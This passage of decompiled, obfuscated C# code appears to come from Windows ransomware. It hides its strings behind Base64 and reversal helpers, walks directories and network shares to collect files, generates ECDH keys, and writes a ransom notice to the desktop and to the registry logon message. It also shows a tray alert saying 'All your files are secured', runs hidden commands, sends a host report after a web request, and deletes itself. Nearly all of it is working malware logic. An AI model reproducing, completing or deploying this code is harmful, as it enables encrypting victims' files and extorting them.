						streamWriter.WriteLine(khBNqVxVYaM(getString_0(107389289)) + khBNqVxVYaM(getString_0(107389609)) + Convert.ToString(lBBLtRfPsPV.Count) + khBNqVxVYaM(getString_0(107389846)));
					}
					if (eSjMTjCatON)
					{
						streamWriter.WriteLine(getString_0(107395814));
						streamWriter.WriteLine(khBNqVxVYaM(getString_0(107390076)));
						streamWriter.WriteLine(YarXNhsRIUck.FgehTUZSzpVn());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395469));
					if (!text7.Contains(jdzEbvPutazU) && !MFCrMNyVwftIF)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389969), khBNqVxVYaM(getString_0(107389289)) + getString_0(107390043) + jdzEbvPutazU + khBNqVxVYaM(getString_0(107389846)));
					}
				}
			}
			catch (Exception ex6)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107389228) + ex6.Message + getString_0(107395814));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (MNBzqiuQfRJQcYj == getString_0(107396866))
		{
			try
			{
				if (mWfsjXfVaDjgsa == getString_0(107396304))
				{
					YarXNhsRIUck.MHjVmifCqLAcb(getString_0(107389203), getString_0(107389166), getString_0(107389153), string.Concat(khBNqVxVYaM(getString_0(107395880)), new WebClient().DownloadString(khBNqVxVYaM(getString_0(107395887))), getString_0(107389176), khBNqVxVYaM(getString_0(107395809)), DateTime.Now, getString_0(107395814), khBNqVxVYaM(getString_0(107389171)), Convert.ToString(lBBLtRfPsPV.Count), getString_0(107395814), khBNqVxVYaM(getString_0(107395800)), jdzEbvPutazU));
				}
				else
				{
					YarXNhsRIUck.MHjVmifCqLAcb(getString_0(107389203), getString_0(107389166), getString_0(107389153), string.Concat(khBNqVxVYaM(getString_0(107395880)), new WebClient().DownloadString(khBNqVxVYaM(getString_0(107395887))), getString_0(107389176), khBNqVxVYaM(getString_0(107395809)), DateTime.Now, getString_0(107395814), khBNqVxVYaM(getString_0(107389171)), Convert.ToString(lBBLtRfPsPV.Count), getString_0(107395814), khBNqVxVYaM(getString_0(107395800)), jdzEbvPutazU));
				}
			}
			catch
			{
			}
		}
		if (xZEDYYkzZNtnw == getString_0(107396866))
		{
			try
			{
				wVMZiCKNqRdFaLa.tWoDqxWeWWrIyM(new Uri(getString_0(107389090)));
			}
			catch
			{
			}
		}
		if (YWANRiRWiwxS == getString_0(107396304) && !fiNlreSRwIMD)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395469)))
				{
					Process.Start(khBNqVxVYaM(getString_0(107389089)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395469));
				}
				try
				{
					if (qqVKUcwYqRObMU)
					{
						Console.WriteLine(getString_0(107389064));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107389547) + ex6.Message + getString_0(107395814));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		else if (YWANRiRWiwxS == getString_0(107396866) && !fiNlreSRwIMD)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389969)))
				{
					Process.Start(khBNqVxVYaM(getString_0(107389526)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389969));
				}
				try
				{
					if (qqVKUcwYqRObMU)
					{
						Console.WriteLine(getString_0(107389477));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107389448) + ex6.Message + getString_0(107395814));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (wvVqxnBdrKxaCFZ == getString_0(107396866))
		{
			if (kvwQzPxIqIlk == getString_0(107396866) && !string.IsNullOrEmpty(VyRGExDcVMKv) && !string.IsNullOrEmpty(DsHDKKZPqyRV))
			{
				QOvyfxAHwzdVBw(VyRGExDcVMKv, DsHDKKZPqyRV);
			}
			else
			{
				QOvyfxAHwzdVBw(getString_0(107389427), getString_0(107389398));
			}
		}
		if (TUGYFpvgdQx != getString_0(107388708))
		{
			JXWobUKGdPniQ(TUGYFpvgdQx);
		}
		if (!string.IsNullOrEmpty(FalYYrscvz))
		{
			try
			{
				File.Delete(FalYYrscvz);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396465))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396465)));
			}
		}
		catch (Exception ex12)
		{
			try
			{
				File.AppendAllText(LImNkSPhwOOQHW, getString_0(107388723) + ex12.Message);
			}
			catch (Exception)
			{
			}
		}
		if (hIFJbdEMJudY)
		{
			try
			{
				File.AppendAllText(LImNkSPhwOOQHW, getString_0(107388646));
			}
			catch (Exception)
			{
			}
		}
		stopwatch.Stop();
		TimeSpan elapsed = stopwatch.Elapsed;
		string contents = string.Format(getString_0(107388665), elapsed.Hours, elapsed.Minutes, elapsed.Seconds, elapsed.Milliseconds / 10);
		if (hIFJbdEMJudY)
		{
			try
			{
				File.AppendAllText(LImNkSPhwOOQHW, contents);
			}
			catch (Exception)
			{
			}
		}
		if (!pIFGXSXFivCGoDR().Contains(getString_0(107388604)))
		{
			try
			{
				tYjyeLOdohO(ApqYNCacJvgq);
			}
			catch (Exception)
			{
			}
			List<string> source = bruHyzeehnYYe;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
				};
			}
			Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		else
		{
			List<string> source2 = bruHyzeehnYYe;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					hsDlrZQtGPkuWD(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107386490))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (AgnlixIASzPo == getString_0(107388599))
		{
			kAlCBmYCeKnIaP();
		}
	}

	public static void enSfSFSRotFC()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(khBNqVxVYaM(OwlNQHGyCZF(getString_0(107388558))), khBNqVxVYaM(getString_0(107389427)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int cSdKRvqchGCRk(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> KHTvJHXHmaBmao(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((LprhUPIkKugxdZ.Count > 0 && LprhUPIkKugxdZ.Contains(text)) || ((text.Contains(getString_0(107388948)) || text.Contains(getString_0(107388923)) || text.Contains(getString_0(107388890)) || text.ToLower().Contains(getString_0(107388841)) || text.ToLower().Contains(getString_0(107388860)) || text.Contains(getString_0(107388803)) || text.Contains(getString_0(107388270)) || text.ToLower().Contains(getString_0(107388257)) || text.ToLower().Contains(getString_0(107388276)) || text.ToLower().Contains(getString_0(107388239)) || text.ToLower().Contains(getString_0(107388198)) || text.ToLower().Contains(getString_0(107388213)) || text.ToLower().Contains(getString_0(107388168)) || text.ToLower().Contains(getString_0(107388187)) || text.ToLower().Contains(getString_0(107388134))) && !text.Contains(khBNqVxVYaM(getString_0(107388109)))))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_0235;
			}
			catch
			{
			}
			continue;
			IL_0235:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388068)) && !fileInfo.FullName.Contains(getString_0(107388083)) && !fileInfo.FullName.Contains(getString_0(107388034)) && !fileInfo.FullName.Contains(getString_0(107388049)) && !fileInfo.FullName.Contains(getString_0(107388512)) && !fileInfo.FullName.Contains(getString_0(107388527)) && !fileInfo.FullName.Contains(getString_0(107388510)) && !fileInfo.FullName.Contains(getString_0(107388461)) && !fileInfo.FullName.Contains(getString_0(107388448)) && !fileInfo.FullName.Contains(getString_0(107388427)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388446)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388433)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388384)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388399)) && !fileInfo.FullName.Contains(khBNqVxVYaM(getString_0(107388382))) && !fileInfo.FullName.Contains(getString_0(107388325)) && !fileInfo.FullName.Contains(getString_0(107388344)) && !fileInfo.FullName.Contains(getString_0(107396465)) && !fileInfo.FullName.Contains(getString_0(107388299)) && !fileInfo.FullName.EndsWith(getString_0(107395539)) && !fileInfo.FullName.EndsWith(getString_0(107388306)) && !fileInfo.FullName.EndsWith(getString_0(107387757)) && !fileInfo.FullName.EndsWith(getString_0(107387752)) && !fileInfo.FullName.EndsWith(getString_0(107387747)) && !fileInfo.FullName.Contains(getString_0(107387774)) && !fileInfo.FullName.Contains(rwyuADDQdblNA) && !fileInfo.FullName.Contains(LImNkSPhwOOQHW) && !fileInfo.FullName.Contains(mqQgvSYgrlnpSvAge))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(rqLFEsCDTMyF) * 1024.0 * 1024.0 && oLUeHhoXSrXL == getString_0(107396866))
						{
							list.Add(fileInfo.FullName);
							CroFdsaclIJU(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && oLUeHhoXSrXL == getString_0(107396304))
						{
							list.Add(fileInfo.FullName);
							CroFdsaclIJU(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void DRxOrUGwGniccexBp()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387725));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!qyAhWYLrtiOtS.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387704), getString_0(107396788)).Replace(getString_0(107387699), getString_0(107387704))
					.Replace(getString_0(107387658), getString_0(107389090))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					qyAhWYLrtiOtS.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387704), getString_0(107396788)).Replace(getString_0(107387699), getString_0(107387704))
						.Replace(getString_0(107387658), getString_0(107389090))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387653), getString_0(107389090)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string hsDlrZQtGPkuWD(string RExJarGPkCr = "", string QWPjyxujgauYoo = "")
	{
		string result = getString_0(107389090);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = RExJarGPkCr,
				Arguments = QWPjyxujgauYoo,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void KpWrBwnRJp(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107387676),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string OwlNQHGyCZF(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string khBNqVxVYaM(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void hZDBsojjvnlVR(string bqZZXjIGHCexdm = "", string QHLDCVFewkv = "SW5mb3JtYXRpb24uLi4=", string IhIMNtWXKFkC = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		bqZZXjIGHCexdm = OwlNQHGyCZF(getString_0(107387627));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(khBNqVxVYaM(bqZZXjIGHCexdm), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(khBNqVxVYaM(getString_0(107387530)), khBNqVxVYaM(QHLDCVFewkv));
				registryKey.SetValue(khBNqVxVYaM(getString_0(107388009)), khBNqVxVYaM(IhIMNtWXKFkC));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			bqZZXjIGHCexdm = OwlNQHGyCZF(getString_0(107387980));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(khBNqVxVYaM(bqZZXjIGHCexdm), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(khBNqVxVYaM(getString_0(107387875)), khBNqVxVYaM(QHLDCVFewkv));
				registryKey.SetValue(khBNqVxVYaM(getString_0(107387842)), khBNqVxVYaM(IhIMNtWXKFkC));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void laibAxkrcZqT()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (kvwQzPxIqIlk == getString_0(107396866) && !string.IsNullOrEmpty(VyRGExDcVMKv) && !string.IsNullOrEmpty(DsHDKKZPqyRV))
				{
					hZDBsojjvnlVR(getString_0(107389090), VyRGExDcVMKv, DsHDKKZPqyRV);
				}
				else
				{
					hZDBsojjvnlVR(getString_0(107389090), getString_0(107389427), getString_0(107389398));
				}
			}
		}
		catch
		{
		}
	}

	public static void QOvyfxAHwzdVBw(string ZpusymWHii = "SW5mb3JtYXRpb24uLi4=", string NaHYjUvbSpJEac = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(khBNqVxVYaM(ZpusymWHii));
		val.set_BalloonTipText(khBNqVxVYaM(NaHYjUvbSpJEac));
		val.ShowBalloonTip(30000);
	}

	public static void JXWobUKGdPniQ(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107387813)), getString_0(107387828) + text + getString_0(107387787) + string_0);
	}

	private static void vOyJYdfWugZWj()
	{
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_027c: Expected O, but got Unknown
		//IL_029e: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a5: Expected O, but got Unknown
		cRTbTQtOLTEXb();
		List<toDWRuOBvXD> list = toDWRuOBvXD.xIgkGbHQPPj();
		foreach (toDWRuOBvXD item in list)
		{
			JPkRLvIGNCy.Add(item.IPAddress);
		}
		List<string> jPkRLvIGNCy = JPkRLvIGNCy;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate20 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate20 = delegate(string string_0)
			{
				azsGgSfLyvmkzG CS_0024_003C_003E8__locals0 = new azsGgSfLyvmkzG();
				CS_0024_003C_003E8__locals0.bkYXYKOePlV = string_0;
				if ((CS_0024_003C_003E8__locals0.bkYXYKOePlV.StartsWith(getString_0(107386396)) || CS_0024_003C_003E8__locals0.bkYXYKOePlV.StartsWith(getString_0(107386391)) || CS_0024_003C_003E8__locals0.bkYXYKOePlV.StartsWith(getString_0(107386350)) || CS_0024_003C_003E8__locals0.bkYXYKOePlV.StartsWith(getString_0(107386350))) && zBiFvXBiIzopyL.sMIgMoBgKW(CS_0024_003C_003E8__locals0.bkYXYKOePlV))
				{
					try
					{
						Thread.Sleep(bcPffxszCs);
						qyAhWYLrtiOtS.Add(getString_0(107387704) + CS_0024_003C_003E8__locals0.bkYXYKOePlV + getString_0(107386337));
						try
						{
							if (qqVKUcwYqRObMU)
							{
								Console.WriteLine(getString_0(107387704) + CS_0024_003C_003E8__locals0.bkYXYKOePlV + getString_0(107386337));
							}
						}
						catch
						{
						}
						Parallel.For(68, 91, delegate(int int_0)
						{
							Thread.Sleep(bcPffxszCs);
							qyAhWYLrtiOtS.Add(azsGgSfLyvmkzG.getString_0(107387710) + CS_0024_003C_003E8__locals0.bkYXYKOePlV + azsGgSfLyvmkzG.getString_0(107396794) + (char)int_0 + azsGgSfLyvmkzG.getString_0(107412105));
							try
							{
								if (qqVKUcwYqRObMU)
								{
									Console.WriteLine(azsGgSfLyvmkzG.getString_0(107387710) + CS_0024_003C_003E8__locals0.bkYXYKOePlV + azsGgSfLyvmkzG.getString_0(107396794) + (char)int_0 + azsGgSfLyvmkzG.getString_0(107412105));
								}
							}
							catch
							{
							}
						});
					}
					catch
					{
					}
				}
			};
		}
		Parallel.ForEach(jPkRLvIGNCy, CS_0024_003C_003E9__CachedAnonymousMethodDelegate20);
		try
		{
			zBiFvXBiIzopyL.DjTYucqnRNl djTYucqnRNl = new zBiFvXBiIzopyL.DjTYucqnRNl(zBiFvXBiIzopyL.bBUnbGwlszoYHbx.jSLRfwwVNxZWla, zBiFvXBiIzopyL.tPReoWvKuOiZ.bWhvBASgSdqbDEGK, zBiFvXBiIzopyL.zjPfvyJtEFf.begkWWnwtqYz, zBiFvXBiIzopyL.BjDCByoiKj.jfpNToxreFv);
			foreach (string item2 in djTYucqnRNl)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107387782));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!qyAhWYLrtiOtS.Contains(item3.ToString()))
						{
							qyAhWYLrtiOtS.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (qqVKUcwYqRObMU)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		aWoJpNyMBThYR.ulErpjjDIgIN();
		try
		{
			if (qqVKUcwYqRObMU)
			{
				Console.WriteLine(getString_0(107387221));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = OwlNQHGyCZF(getString_0(107387980));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(khBNqVxVYaM(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(khBNqVxVYaM(getString_0(107387148)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(khBNqVxVYaM(getString_0(107387123)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (KMWeqbAyUYuGHH == getString_0(107396866))
		{
			xHzpPrHTVbq.kefPflOplngoCN();
		}
		try
		{
			if (qqVKUcwYqRObMU)
			{
				Console.WriteLine(getString_0(107387046));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387725));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (qyAhWYLrtiOtS.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387704), getString_0(107396788)).Replace(getString_0(107387699), getString_0(107387704))
					.Replace(getString_0(107387658), getString_0(107389090))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (qqVKUcwYqRObMU)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387704), getString_0(107396788)).Replace(getString_0(107387699), getString_0(107387704))
							.Replace(getString_0(107387658), getString_0(107389090))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387653), getString_0(107389090)));
					}
				}
				catch
				{
				}
				qyAhWYLrtiOtS.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387704), getString_0(107396788)).Replace(getString_0(107387699), getString_0(107387704))
					.Replace(getString_0(107387658), getString_0(107389090))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387653), getString_0(107389090)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (qqVKUcwYqRObMU)
			{
				Console.WriteLine(getString_0(107387501));
			}
		}
		catch
		{
		}
	}

	public static bool QeIEovdzTICF()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107387432));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void tYjyeLOdohO(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = khBNqVxVYaM(getString_0(107387399));
		processStartInfo.Arguments = getString_0(107387370) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool zZreWIIwDWlLBwg(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void kwCznOOXZRpq(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] array = null;
			array = (CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(khBNqVxVYaM(getString_0(107387340))) : Encoding.ASCII.GetBytes(khBNqVxVYaM(getString_0(107387365))));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(array, 0, array.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void cRTbTQtOLTEXb()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107387347)), khBNqVxVYaM(getString_0(107387302)));
			hsDlrZQtGPkuWD(khBNqVxVYaM(getString_0(107387347)), khBNqVxVYaM(getString_0(107386660)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string gnuFdBFgFHiiQ(string SyVMFzIWkC, int AaNnKlJzltcof = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(AaNnKlJzltcof);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(SyVMFzIWkC, 1, intPtr, ref AaNnKlJzltcof) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static string UJYexohujGO(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	public static byte[] GhLmriLVJtiPXg(string string_0)
	{
		return Convert.FromBase64String(string_0);
	}

	public static void CRArfjwFRvgmOa()
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Create(CngAlgorithm.ECDiffieHellmanP521, null, new CngKeyCreationParameters
		{
			ExportPolicy = CngExportPolicies.AllowPlaintextExport
		}));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		VfmZCqDrTnYlT = eCDiffieHellmanCng.Key.Export(CngKeyBlobFormat.EccPrivateBlob);
		FfXSrTItXwhd = eCDiffieHellmanCng.PublicKey.ToByteArray();
	}

	public static byte[] VORYuwjbhiJq(byte[] byte_0, byte[] byte_1)
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Import(byte_0, CngKeyBlobFormat.EccPrivateBlob));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		return eCDiffieHellmanCng.DeriveKeyMaterial(CngKey.Import(byte_1, CngKeyBlobFormat.EccPublicBlob));
	}

	public static void kAlCBmYCeKnIaP()
	{
		hsDlrZQtGPkuWD(getString_0(107396577), khBNqVxVYaM(getString_0(107386546)));
		string text = khBNqVxVYaM(getString_0(107386864));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107387658) + text + getString_0(107387658) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396577);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void ZJtjVIJZvG(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386799) + string_0 + getString_0(107386758) + ex.Message + getString_0(107395814));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string pIFGXSXFivCGoDR()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389090);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386157);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386180))) ? getString_0(107386194) : getString_0(107386203));
				break;
			case 0:
				text = getString_0(107386185);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386152);
				break;
			case 4:
				text = getString_0(107386171);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107388604) : getString_0(107386162));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107386134) : getString_0(107386139)) : getString_0(107386112)) : getString_0(107386121));
				break;
			case 10:
				text = getString_0(107386129);
				break;
			}
		}
		if (text != getString_0(107389090))
		{
			text = getString_0(107386092) + text;
			if (oSVersion.ServicePack != getString_0(107389090))
			{
				text = text + getString_0(107387787) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string wqTwhxeRSMAULyq(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395469);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(khBNqVxVYaM(getString_0(107394924)));
				streamWriter.WriteLine(getString_0(107395814));
				streamWriter.WriteLine(khBNqVxVYaM(getString_0(107389658)));
				streamWriter.WriteLine(string_0);
				if (eSjMTjCatON)
